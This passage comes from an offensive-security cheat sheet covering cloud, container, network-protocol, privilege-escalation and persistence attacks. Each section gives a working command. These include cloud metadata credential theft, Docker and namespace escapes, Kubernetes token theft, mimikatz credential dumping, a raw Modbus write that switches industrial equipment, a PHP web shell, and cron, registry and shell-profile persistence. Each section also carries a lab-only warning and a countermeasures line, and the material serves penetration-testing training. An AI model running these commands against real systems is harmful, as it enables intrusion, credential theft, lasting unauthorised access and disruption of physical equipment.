## Section 75: WebSockets Message Spoofing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects unvalidated messages into active WebSocket connections. Exploits weaknesses where servers do not re-authorize incoming frame payloads.

### 💻 Command / Payload
```bash
wscat -c ws://<target>/chat -x '{"action":"broadcast","message":"Malicious payload"}'
```

### 📋 Expected Output
Spoofed messages broadcasted to other chat clients, database manipulation, or DOM XSS.

### 🛡️ Countermeasures
Enforce session validation on every WebSocket message. Validate schema structures on incoming data packets.

---

# Phase 5: ☁️ Cloud & Container Security

---

## Section 76: AWS IMDSv2 Bypass Attempts

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Requests an IMDSv2 authentication token to bypass SSRF restrictions. In SSRF contexts, headers cannot always be injected, mitigating the bypass.

### 💻 Command / Payload
```bash
curl -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -X PUT http://169.254.169.254/latest/api/token
# Then use token:
curl -H 'X-aws-ec2-metadata-token: <TOKEN>' http://169.254.169.254/latest/meta-data/
```

### 📋 Expected Output
IAM credentials, instance profile information, metadata configurations.

### 🛡️ Countermeasures
Restrict instance metadata access to root user. Disable IMDS access where not needed. Block SSRF locally.

---

## Section 77: AWS IAM Policy Misconfiguration Auditing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Audits policies to locate wildcards or overly broad privilege scopes (e.g., Allow `s3:*` on all objects) that allow privilege escalation.

### 💻 Command / Payload
```bash
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::<ID>:user/<USER> --action-names ec2:RunInstances s3:GetObject
```

### 📋 Expected Output
Simulation results showing whether permissions are allowed, helping map privilege escalation routes.

### 🛡️ Countermeasures
Least-privilege permission architecture. Restrict wildcards. Use AWS IAM Access Analyzer.

---

## Section 78: AWS S3 Bucket Open Access Verification

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Checks if S3 buckets are public or have read/write access allowed for unauthenticated users.

### 💻 Command / Payload
```bash
aws s3 ls s3://<bucket-name> --no-sign-request
```

### 📋 Expected Output
List of objects or files inside the target S3 bucket.

### 🛡️ Countermeasures
Block Public Access at account level. Set strict bucket policies and ACLs. Regular bucket access reviews.

---

## Section 79: Azure AD Reconnaissance (Microburst)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Identifies exposed Azure AD services, active subdomains, and public endpoints.

### 💻 Command / Payload
```bash
Get-AzureDomainInfo -BaseDomain <domain>.onmicrosoft.com
```

### 📋 Expected Output
List of Azure services, configured domains, and active portals.

### 🛡️ Countermeasures
Implement conditional access policies. Restrict Azure AD tenant discovery permissions.

---

## Section 80: Azure VM Managed Identity Token Theft

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Steals identity tokens from local Azure VM metadata endpoints, granting credentials to access subscription resources.

### 💻 Command / Payload
```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H 'Metadata: true'
```

### 📋 Expected Output
JWT OAuth token usable with Azure CLI or API tools.

### 🛡️ Countermeasures
Disable system-assigned managed identities if unused. Restrict local HTTP requests via local firewalls.

---

## Section 81: Google Cloud Storage Bucket Data Exfiltration

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Probes GCP storage buckets to verify if object permissions allow public indexing or downloading.

### 💻 Command / Payload
```bash
curl -i https://storage.googleapis.com/<bucket_name>
```

### 📋 Expected Output
XML list of bucket contents or downloadable objects.

### 🛡️ Countermeasures
Disable public access at the GCP project level. Enforce IAM authentication for storage accounts.

---

## Section 82: Docker Socket Escape (Host Mount Abuse)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses a mounted Docker socket (/var/run/docker.sock) to spin up a privileged container with root host filesystem access, achieving breakout.

### 💻 Command / Payload
```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
# In container:
docker run --privileged --net=host --pid=host -v /:/host -it alpine chroot /host
```

### 📋 Expected Output
Root shell access on the host operating system.

### 🛡️ Countermeasures
Never mount the Docker socket in untrusted containers. Use rootless Docker configurations.

---

## Section 83: Docker Container Privilege Escalation (SYS_ADMIN)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses excessive capability assignments (like SYS_ADMIN or privileged flags) to escape namespaces and access host disks directly.

### 💻 Command / Payload
```bash
capsh --print
# Look for cap_sys_admin
mount -t ext4 /dev/sda1 /mnt
```

### 📋 Expected Output
Breakout to host shell or host hardware storage access.

### 🛡️ Countermeasures
Remove default capability profiles. Do not run containers with --privileged. Enforce read-only rootfs.

---

## Section 84: Kubernetes API Server Access Auditing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Tests if the Kubernetes API server endpoint allows anonymous queries or uses default system certificates.

### 💻 Command / Payload
```bash
curl -k https://<IP>:6443/api/v1/namespaces
```

### 📋 Expected Output
JSON output containing namespaces, pods, services, and secrets.

### 🛡️ Countermeasures
Disable anonymous auth in kube-apiserver configs. Enable RBAC constraints. Limit external network exposure.

---

## Section 85: Kubernetes Service Account Token Theft

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Steals default tokens mounted in pod containers, using them to query the API server.

### 💻 Command / Payload
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 📋 Expected Output
Kubernetes JWT service token usable with kubectl commands.

### 🛡️ Countermeasures
Disable automountServiceAccountToken in pod specs. Restrict service account scopes using RBAC.

---

## Section 86: Kubernetes Kubelet API Exploit

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits open Kubelet APIs (port 10250) that have disabled authentication, executing commands inside active containers.

### 💻 Command / Payload
```bash
curl -k -X POST https://<IP>:10250/run/<namespace>/<pod>/<container> -d 'cmd=id'
```

### 📋 Expected Output
Command execution output from target container.

### 🛡️ Countermeasures
Enable client certificate authentication on Kubelet configurations. Restrict access via network firewalls.

---

## Section 87: Container Cgroup Directory Escape

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits cgroup notification mechanisms in privileged containers to execute arbitrary files on the host system.

### 💻 Command / Payload
```bash
# Inside a container running as root with SYS_ADMIN:
mkdir /tmp/cgroup
mount -t cgroup -o rdma cgroup /tmp/cgroup
echo 1 > /tmp/cgroup/notify_on_release
# Write host command execution trigger to release_agent
```

### 📋 Expected Output
Host command execution as root.

### 🛡️ Countermeasures
Disable container root permissions. Use AppArmor/SELinux profiles. Remove SYS_ADMIN capability.

---

## Section 88: Container Host PID Namespace Sharing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses host PID namespace sharing flag (--pid=host) to enter the host's namespaces, achieving full container escape.

### 💻 Command / Payload
```bash
docker run --pid=host -it alpine sh
# Inside container:
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

### 📋 Expected Output
Root shell access on the host operating system.

### 🛡️ Countermeasures
Do not share the host PID namespace. Enforce strict Kubernetes Pod Security Standards.

---

## Section 89: Cloud Instance Metadata SSRF Exfiltration

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Queries GCP metadata endpoints via SSRF. GCP requires a custom 'Metadata-Flavor' header, preventing basic SSRF unless header injection is possible.

### 💻 Command / Payload
```bash
curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env'
```

### 📋 Expected Output
Internal environment variables, cluster configuration info, boot tokens.

### 🛡️ Countermeasures
Enforce header checks strictly. Upgrade metadata client requirements. Disable access where unused.

---

## Section 90: Serverless Function Environment Variable Theft

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Leaks environment variables stored inside serverless containers (like AWS Lambda) through variable print errors.

### 💻 Command / Payload
```bash
process.env / os.environ
```

### 📋 Expected Output
Database credentials, third-party API keys, and deployment secret tokens.

### 🛡️ Countermeasures
Encrypt environment variables using AWS KMS. Restrict deployment access scopes. Avoid logging env dumps.

---

# Phase 6: 🌐 Infrastructure & Protocol Exploitation

---

## Section 91: VLAN Hopping Attack (Yersinia)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits 802.1Q dynamic trunking protocols (DTP) to hop from one VLAN network segment to another without passing through a routing filter.

### 💻 Command / Payload
```bash
yersinia 8021q -attack 1
```

### 📋 Expected Output
Access to isolated VLAN interfaces and subnets.

### 🛡️ Countermeasures
Disable DTP (switchport nonegotiate). Set native VLANs to unused IDs. Manually configure access ports.

---

## Section 92: DHCP Starvation Attack

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Floods DHCP servers with spoofed MAC addresses, consuming all available IP leases in the subnet address pool.

### 💻 Command / Payload
```bash
yersinia dhcp -attack 1
```

### 📋 Expected Output
Denial of service for new joining network clients.

### 🛡️ Countermeasures
Configure DHCP Snooping on network switches. Enforce MAC address limits on switch ports.

---

## Section 93: CDP/LLDP Reconnaissance & Spoofing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sniffs or injects Cisco Discovery Protocol packets to discover switch models, port details, and internal configurations.

### 💻 Command / Payload
```bash
yersinia cdp -attack 0
```

### 📋 Expected Output
Exposed router/switch device configurations, software versions, and subnets.

### 🛡️ Countermeasures
Disable CDP/LLDP on switch interfaces where not required (such as edge client ports).

---

## Section 94: STP Root Bridge Election Hijacking

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects STP Configuration BPDUs with lowest priority to force root bridge elections, redirecting traffic flow through the attacker's system.

### 💻 Command / Payload
```bash
yersinia stp -attack 1
```

### 📋 Expected Output
Man-in-the-middle network interception of inter-switch traffic.

### 🛡️ Countermeasures
Enable BPDU Guard and Root Guard on switch edge ports. Hardcode bridge priority levels.

---

## Section 95: HSRP/VRRP Gateway Hijacking

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sends HSRP/VRRP advertisements claiming higher priority, hijacking the default gateway IP configuration.

### 💻 Command / Payload
```bash
yersinia hsrp -attack 1
```

### 📋 Expected Output
Redirected client gateway traffic, enabling sniffing and decryption.

### 🛡️ Countermeasures
Enable authentication for HSRP/VRRP groups. Use IPsec bindings for gateway protocols.

---

## Section 96: SNMP v1/v2c Community String Guessing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Brute-forces SNMP community strings using dictionary lists to obtain read/write configuration access.

### 💻 Command / Payload
```bash
onesixtyone -c community_list.txt <IP>
```

### 📋 Expected Output
System details, network configurations, or active credentials.

### 🛡️ Countermeasures
Use SNMPv3 with encryption. Limit community string dictionaries. Disable SNMP if unused.

---

## Section 97: SMTP Open Relay Mail Spoofing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Checks if SMTP servers allow sending emails to external destinations without prior authentication.

### 💻 Command / Payload
```bash
swaks --to victim@target.com --from spoofed@target.com --server <IP> --body 'Test'
```

### 📋 Expected Output
Successful delivery confirmations of spoofed emails.

### 🛡️ Countermeasures
Disable open relay configurations. Restrict mail relay permissions to authenticated subnet ranges.

---

## Section 98: SMTP User Enumeration (VRFY/EXPN)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Queries SMTP servers using VRFY or EXPN commands to verify if specific usernames exist on the target.

### 💻 Command / Payload
```bash
smtp-user-enum -M VRFY -U users.txt -t <IP>
```

### 📋 Expected Output
List of valid internal usernames or mail groups.

### 🛡️ Countermeasures
Disable VRFY and EXPN commands in mail server configurations.

---

## Section 99: FTP Bounce Scanning Attack

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses misconfigured FTP servers that allow PORT commands to scan external ports indirectly, hiding the scanner's source IP.

### 💻 Command / Payload
```bash
nmap -b <FTP_user>:<FTP_pass>@<FTP_IP> <target>
```

### 📋 Expected Output
Port scanning results showing up through the FTP proxy server.

### 🛡️ Countermeasures
Disable FTP PORT command proxying. Restrict FTP server outbound network access.

---

## Section 100: SSH Brute Force & Authorized Keys Inject

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Performs dictionary brute-force attacks on SSH, then persists by writing an SSH public key directly to authorized_keys.

### 💻 Command / Payload
```bash
hydra -l root -P passwords.txt ssh://<IP>
# Inject key:
echo '<SSH_KEY>' >> /root/.ssh/authorized_keys
```

### 📋 Expected Output
Authenticated SSH access to target shell.

### 🛡️ Countermeasures
Disable password authentication (use key-only). Implement fail2ban. Restrict SSH root access.

---

## Section 101: RDP Session Hijacking (tscon)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Allows administrators on Windows servers to hijack active console sessions of other users without password verification.

### 💻 Command / Payload
```bash
tscon.exe <session_id> /dest:console
```

### 📋 Expected Output
Direct desktop access as the hijacked user.

### 🛡️ Countermeasures
Restrict local administrator rights. Require re-authentication for console session takeovers.

---

## Section 102: RDP BlueKeep (CVE-2019-0708) Concept

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Scans for RDP channels vulnerable to remote code execution (RCE) via system memory corruption.

### 💻 Command / Payload
```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <IP>
```

### 📋 Expected Output
Vulnerability confirmations or system crashes.

### 🛡️ Countermeasures
Apply Microsoft security patches. Enable Network Level Authentication (NLA) on RDP configurations.

---

## Section 103: SMB Session Null Session Connection

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Establishes connections to Windows SMB shares without presenting usernames or password credentials.

### 💻 Command / Payload
```bash
smbclient -L //<IP> -N
```

### 📋 Expected Output
Exposed share directories, IPC$ access, domain users list, and GPO policies.

### 🛡️ Countermeasures
Disable SMB null session binds (RestrictNullSessAccess=1). Update SMB protocol versions.

---

## Section 104: VNC Password Decryption

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Decrypts VNC credentials stored in local system configuration files.

### 💻 Command / Payload
```bash
vncpasswd -d ~/.vnc/passwd
```

### 📋 Expected Output
Plaintext VNC password string.

### 🛡️ Countermeasures
Encrypt configuration stores. Use strong VNC security modes. Restrict filesystem access.

---

## Section 105: IPSec VPN Aggressive Mode PSK Cracking

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Queries VPN gateways using aggressive mode to capture pre-shared key (PSK) negotiation hashes for offline cracking.

### 💻 Command / Payload
```bash
ike-scan -A -P vpn_psk.txt <IP>
hashcat -m 5600 vpn_psk.txt wordlist.txt
```

### 📋 Expected Output
Captured VPN handshake file, cracked pre-shared key string.

### 🛡️ Countermeasures
Use main mode for IPsec negotiations. Enforce strong, complex pre-shared keys.

---

## Section 106: DNS Cache Poisoning (Kaminsky Attack Concept)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects spoofed DNS responses into cache registers, redirecting user domains to malicious IPs.

### 💻 Command / Payload
```bash
# DNS redirection payloads using forged response packets
```

### 📋 Expected Output
Interrupted resolution states, redirecting users to spoofed web servers.

### 🛡️ Countermeasures
Implement DNSSEC. Enable source port randomization for DNS server queries.

---

## Section 107: BGP Route Hijacking Concepts

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Broadcasts false BGP routing tables to redirect global network traffic pathways.

### 💻 Command / Payload
```bash
# Simulated BGP route advertisement packets
```

### 📋 Expected Output
Redirected routing hops, allowing traffic analysis or interception.

### 🛡️ Countermeasures
Implement RPKI route validation. Use peer authentication for BGP sessions.

---

## Section 108: NTP Amplification Distributed DoS

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses the NTP 'monlist' command to request lists of recent query IPs, generating amplified traffic payloads directed at target targets.

### 💻 Command / Payload
```bash
ntpdc -n -c monlist <IP>
```

### 📋 Expected Output
Gigabytes of reflected UDP traffic directed at target systems.

### 🛡️ Countermeasures
Disable monlist command in ntp.conf. Update NTP software. Configure traffic rate-limit filters.

---

## Section 109: SIP VoIP Calling Session Interception

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sniffs SIP network traffic to extract voice authentication handshakes for offline cracking.

### 💻 Command / Payload
```bash
sipdump -i eth0
sipcrack -w wordlist.txt sipdump.txt
```

### 📋 Expected Output
Cracked VoIP SIP authentication passwords.

### 🛡️ Countermeasures
Encrypt VoIP traffic using SIPS and SRTP protocols. Restrict access via network isolation.

---

## Section 110: Modbus/TCP ICS Command Injection

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sends raw Modbus TCP commands directly to PLC registers, turning equipment switches on or off without authentication.

### 💻 Command / Payload
```bash
python3 -c "import socket; s=socket.socket(); s.connect(('<IP>', 502)); s.send(b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00')"
```

### 📋 Expected Output
Forced physical device switch actions (e.g., stopping valves or pumps).

### 🛡️ Countermeasures
Segment OT networks from IT networks. Enable encrypted communications where supported. Use network firewalls.

---

# Phase 7: 🔑 Privilege Escalation & Persistence

---

## Section 111: UAC Bypass via Mock Folders & DLL Hijacking

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Creates a mocked Windows directory containing space characters to hijack DLL files loaded by elevated binaries, bypassing User Account Control.

### 💻 Command / Payload
```bash
mkdir '\\?\C:\Windows \System32'
copy C:\Windows\System32\computerdefaults.exe 'C:\Windows \System32'
# Place custom DLL inside to trigger bypass
```

### 📋 Expected Output
Elevated shell executing as administrator without UAC prompts.

### 🛡️ Countermeasures
Enable UAC Always Notify rules. Do not use local administrator accounts for daily work.

---

## Section 112: SeImpersonatePrivilege Abuse (PrintSpoofer)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses local service token impersonation privileges to obtain SYSTEM-level execution contexts.

### 💻 Command / Payload
```bash
PrintSpoofer64.exe -c 'cmd.exe'
```

### 📋 Expected Output
SYSTEM shell console prompt.

### 🛡️ Countermeasures
Restrict SeImpersonatePrivilege assignments. Remove service accounts from local administrator groups.

---

## Section 113: SeBackupPrivilege SAM/SYSTEM Extraction

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses file backup privileges to copy active SAM and SYSTEM hives to disk, extracting local administrator hashes.

### 💻 Command / Payload
```bash
reg save HKLM\SAM sam.save /y
reg save HKLM\SYSTEM system.save /y
```

### 📋 Expected Output
Saved SAM files containing local system credential hashes.

### 🛡️ Countermeasures
Restrict backup operator groups. Protect registry hives via endpoint configurations.

---

## Section 114: SeTakeOwnershipPrivilege Abuse

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses ownership change privileges to write to protected system binary files.

### 💻 Command / Payload
```bash
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant %username%:F
```

### 📋 Expected Output
Ownership flags updated on system executable files.

### 🛡️ Countermeasures
Audit privilege scopes. Monitor file access logs for administrative changes.

---

## Section 115: SeDebugPrivilege LSASS Memory Injection

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses system debug permissions to read and dump memory segments of high-privilege processes like LSASS.

### 💻 Command / Payload
```bash
mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords'
```

### 📋 Expected Output
 Plaintext credentials and system hashes read from memory.

### 🛡️ Countermeasures
Restrict SeDebugPrivilege to authorized accounts only. Enable LSASS protection (RunAsPPL).

---

## Section 116: Unquoted Service Path Privilege Escalation

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits paths missing quote boundaries in service configurations, placing malicious binaries in parent directories (e.g., C:\Program.exe).

### 💻 Command / Payload
```bash
wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\windows\' | findstr /i /v '"'
```

### 📋 Expected Output
Malicious execution when the system restarts the service.

### 🛡️ Countermeasures
Place quotes around all service path configurations. Restrict write permissions on program roots.

---

## Section 117: Insecure Service Executable Permissions Abuse

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Locates services whose binary files can be modified or overwritten by low-privilege users.

### 💻 Command / Payload
```bash
accesschk.exe -uwcqv "Authenticated Users" *
```

### 📋 Expected Output
Modified service binaries executing as LocalSystem.

### 🛡️ Countermeasures
Ensure low-privilege users do not have write access to service directories.

---

## Section 118: AlwaysInstallElevated MSI Package Execution

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits Group Policy configurations allowing standard users to install applications with SYSTEM-level privileges.

### 💻 Command / Payload
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i shell.msi
```

### 📋 Expected Output
SYSTEM command execution triggered via installer packages.

### 🛡️ Countermeasures
Disable AlwaysInstallElevated registry configurations for both computer and user policies.

---

## Section 119: Linux SUID/SGID Binary Exploitation

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Locates files configured with Set Owner User ID permissions, abusing custom tools to obtain root shells.

### 💻 Command / Payload
```bash
find / -perm -4000 -type f 2>/dev/null
```

### 📋 Expected Output
Privilege escalation to root shell.

### 🛡️ Countermeasures
Regularly audit SUID files. Remove SUID bits from unnecessary binaries. Use nosuid mount flags.

---

## Section 120: Linux Cron Job Wildcard Injection

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses wildcard parameters (*) inside cron tasks. Interprets specifically named files as shell commands when tar/zip runs.

### 💻 Command / Payload
```bash
echo 'payload' > --checkpoint-action=exec=sh\ exploit.sh
tar -cf archive.tar *
```

### 📋 Expected Output
Arbitrary command execution when target cron job triggers.

### 🛡️ Countermeasures
Avoid using wildcards in shell scripts. Explicitly specify target files inside cron tasks.

---

## Section 121: Linux Sudoers File Misconfiguration Abuse

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits loose sudo configurations allowing users to run system commands without typing passwords.

### 💻 Command / Payload
```bash
sudo -l
sudo find . -exec /bin/sh \; -quit
```

### 📋 Expected Output
Root shell access.

### 🛡️ Countermeasures
Apply strict least-privilege policies in sudoers configurations. Restrict access to find/awk/tar via sudo.

---

## Section 122: Windows Registry Run Keys Persistence

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Writes payload targets directly to run keys to ensure execution whenever users log in.

### 💻 Command / Payload
```bash
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d 'C:\Users\Public\shell.exe'
```

### 📋 Expected Output
Persistent payload executions on system startups.

### 🛡️ Countermeasures
Monitor run registry keys. Configure user restrictions on registry write permissions.

---

## Section 123: Windows Scheduled Tasks Registry Persistence

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Creates scheduled tasks to execute shell payloads at specific time thresholds.

### 💻 Command / Payload
```bash
schtasks /create /tn 'SystemUpdate' /tr 'C:\Users\Public\shell.exe' /sc daily /st 12:00
```

### 📋 Expected Output
Triggered executable tasks running persistently.

### 🛡️ Countermeasures
Restrict task scheduler permissions. Monitor task registrations using audit event logs.

---

## Section 124: Windows Winlogon Shell Key Hijacking

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Hijacks Windows logon key parameters to execute payloads alongside the user desktop explorer process.

### 💻 Command / Payload
```bash
reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Shell /t REG_SZ /d 'explorer.exe, C:\Users\Public\shell.exe' /f
```

### 📋 Expected Output
Persistently running shells executing on user logins.

### 🛡️ Countermeasures
Protect HKLM Winlogon keys. Monitor system registry changes via endpoint detectors.

---

## Section 125: Windows WMI Event Subscription Persistence

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Registers system event handlers in WMI namespaces to trigger payloads when systems boot or logs trigger.

### 💻 Command / Payload
```bash
# PowerShell WMI Event Filter, Consumer, and Binding registration scripts
```

### 📋 Expected Output
Persistent payload executions running invisibly via WMI.

### 🛡️ Countermeasures
Monitor WMI namespaces. Audit EventConsumer registrations using Sysmon event ID 19/20/21.

---

## Section 126: Windows Service Creation (SC Config) Persistence

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Registers custom system services to run payload binaries at boot time.

### 💻 Command / Payload
```bash
sc create SystemService binpath= 'C:\Users\Public\shell.exe' start= auto
```

### 📋 Expected Output
Persistent SYSTEM-level shells running on system startup.

### 🛡️ Countermeasures
Restrict service registration capabilities. Monitor service installations using Event ID 7045.

---

## Section 127: Linux SSH Key Persistence (Authorized Keys)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Appends an SSH public key directly to target files to allow persistent passwordless access.

### 💻 Command / Payload
```bash
echo 'ssh-rsa AAAAB3N...' >> ~/.ssh/authorized_keys
```

### 📋 Expected Output
Persistent SSH access to the user shell.

### 🛡️ Countermeasures
Monitor changes to ~/.ssh/authorized_keys. Restrict SSH login permissions for root users.

---

## Section 128: Linux Systemd Service Persistence

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Registers systemd service scripts to run custom scripts when Linux systems boot.

### 💻 Command / Payload
```bash
# Place custom .service file in /etc/systemd/system/
```

### 📋 Expected Output
Persistent payload execution running at startup.

### 🛡️ Countermeasures
Restrict write permissions on /etc/systemd/system/. Monitor active services.

---

## Section 129: Linux RC.local Script Hijacking

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Appends shell triggers to rc.local configurations, running payloads on boot.

### 💻 Command / Payload
```bash
echo 'sh /tmp/shell.sh' >> /etc/rc.local
```

### 📋 Expected Output
Persistent command execution running at boot.

### 🛡️ Countermeasures
Disable rc-local service where unused. Restrict write permissions on /etc/rc.local.

---

## Section 130: Linux Cron Tab Persistent Shells

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Registers periodic cron tasks to execute payloads automatically.

### 💻 Command / Payload
```bash
(crontab -l; echo '* * * * * /tmp/shell.sh') | crontab -
```

### 📋 Expected Output
Scheduled payload executions running repeatedly.

### 🛡️ Countermeasures
Restrict cron directory access. Audit active cron files (/etc/crontab, /var/spool/cron/).

---

## Section 131: Linux User Shell Profile Hijacking (.bashrc)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Appends commands to bash configuration profiles, running them whenever users start interactive terminal sessions.

### 💻 Command / Payload
```bash
echo 'sh /tmp/shell.sh' >> ~/.bashrc
```

### 📋 Expected Output
Persistent shells running whenever users log in.

### 🛡️ Countermeasures
Ensure shell configuration files have read-only permissions for default users. Monitor changes.

---

## Section 132: Windows Active Directory AdminSDHolder Persistence

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Modifies ACL permissions of AdminSDHolder container templates, automatically propagating persistent write rights to protected AD groups.

### 💻 Command / Payload
```bash
# Modify AdminSDHolder object ACLs using Active Directory modules
```

### 📋 Expected Output
Persistent Domain Admin access via ACL delegations.

### 🛡️ Countermeasures
Audit ACL configurations on the AdminSDHolder container. Monitor group modifications.

---

## Section 133: Windows AD Security Descriptor modification persistence

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Injects DC replication permissions into domain control nodes to allow remote credential syncing.

### 💻 Command / Payload
```bash
# Update security descriptors on domain roots to grant DC-Sync rights
```

### 📋 Expected Output
Persistent DCSync capability from standard domain account contexts.

### 🛡️ Countermeasures
Audit security descriptor modifications on Active Directory domain root partitions.

---

## Section 134: Linux Web Server Backdoor (PHP Web Shell)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Writes small backdoor scripts to accessible server directories, providing shell access via web URLs.

### 💻 Command / Payload
```bash
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

### 📋 Expected Output
Persistent command execution access via standard web ports.

### 🛡️ Countermeasures
Disable write permissions on web folders. Enforce code integrity checks. Scan web folders for backdoors.

---

## Section 135: Windows Netsh Helper DLL Persistence

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Registers custom helper libraries in Windows Netsh command tools, loading them automatically on execution.

### 💻 Command / Payload
```bash
netsh add helper C:\Users\Public\helper.dll
```

### 📋 Expected Output
Persistent dll execution running whenever netsh utilities start.

### 🛡️ Countermeasures
Monitor Netsh helper registry configurations. Restrict access to Netsh configuration settings.


---

# Phase 8: 🛡️ Evasion, Obfuscation & Defense Bypass

---

## Section 136: PowerShell Execution Policy Bypass

